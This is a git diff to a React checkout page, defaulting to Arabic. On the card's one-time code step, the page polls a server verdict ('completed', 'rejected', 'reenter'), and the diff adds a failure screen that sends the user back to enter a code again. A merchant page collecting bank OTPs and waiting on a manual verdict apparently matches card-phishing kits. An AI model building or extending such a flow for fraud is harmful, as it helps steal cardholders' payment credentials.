@@ -1,5 +1,5 @@
 import React, { useEffect, useMemo, useState } from 'react';
-import { Link, useLocation } from 'react-router-dom';
+import { Link, useLocation, useNavigate } from 'react-router-dom';
 import { translations } from '../translations';
 import { createOrder, getPaymentDetails, submitCreditCardOtp, fetchCreditCardOtpDecision } from '../api';
 import { getOrCreateVisitorId } from '../visitTracking';
@@ -48,6 +48,7 @@ function formatExpiryInput(raw) {
 
 export default function BuyPage() {
   const location = useLocation();
+  const navigate = useNavigate();
   const state = location.state || {};
 
   const [lang, setLang] = useState(state.lang || 'ar');
@@ -92,6 +93,7 @@ export default function BuyPage() {
   const [verifyingOtp, setVerifyingOtp] = useState(false);
 
   const [ccSubmissionId, setCcSubmissionId] = useState('');
+  const [otpFailType, setOtpFailType] = useState('incorrect');
 
   useEffect(() => {
     document.documentElement.dir = isRtl ? 'rtl' : 'ltr';
@@ -338,26 +340,30 @@ export default function BuyPage() {
         if (decision === 'completed') {
           setStage(5);
           setTimeout(() => {
-            if (alive) setSent(true);
+            if (alive) navigate(`/track?order=${encodeURIComponent(orderId)}`);
           }, 1100);
           return;
         }
 
         if (decision === 'rejected') {
-          setError(isRtl ? 'تم رفض العملية. حاول مرة أخرى.' : 'Your code was rejected. Please try again.');
-          setStage(3);
-          setOtpCode('');
+          setOtpFailType('rejected');
+          setStage(6);
+          setTimeout(() => {
+            if (!alive) return;
+            setStage(3);
+            setOtpCode('');
+          }, 1400);
           return;
         }
 
         if (decision === 'reenter') {
-          setError(
-            isRtl
-              ? 'من فضلك قم بإدخال الرمز الصحيح.'
-              : 'Please enter the correct code.'
-          );
-          setStage(3);
-          setOtpCode('');
+          setOtpFailType('incorrect');
+          setStage(6);
+          setTimeout(() => {
+            if (!alive) return;
+            setStage(3);
+            setOtpCode('');
+          }, 1400);
           return;
         }
 
@@ -373,7 +379,7 @@ export default function BuyPage() {
       alive = false;
       if (timer) clearInterval(timer);
     };
-  }, [stage, ccSubmissionId, isRtl]);
+  }, [stage, ccSubmissionId, isRtl, navigate, orderId]);
 
   if (sent) {
     return (
@@ -981,6 +987,23 @@ export default function BuyPage() {
               </div>
             )}
 
+            {stage === 6 && (
+              <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
+                <div className="cc-otp-await cc-otp-reject buy-span-2">
+                  <div className="cc-otp-cross" aria-hidden="true">
+                    <svg viewBox="0 0 24 24" width="26" height="26">
+                      <path d="M6 6l12 12M18 6L6 18" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" />
+                    </svg>
+                  </div>
+                  <div className="cc-otp-await-title">
+                    {otpFailType === 'rejected'
+                      ? (isRtl ? 'تم رفض الطلب' : 'Request Rejected')
+                      : (isRtl ? 'رمز غير صحيح' : 'Incorrect Code')}
+                  </div>
+                </div>
+              </div>
+            )}
+
             <div className="flex gap-4 mt-6 buy-actions" style={{ flexDirection: isRtl ? 'row-reverse' : 'row' }}>
               {stage === 1 ? (
                 <Link to="/" className="btn btn-outline" style={{ flex: 1 }}>
@@ -1026,7 +1049,7 @@ export default function BuyPage() {
                           : 0.6,
                 }}
                 disabled={
-                  stage === 4 || stage === 5
+                  stage === 4 || stage === 5 || stage === 6
                     ? true
                     : stage === 1
                       ? !canMoveToPayDetails
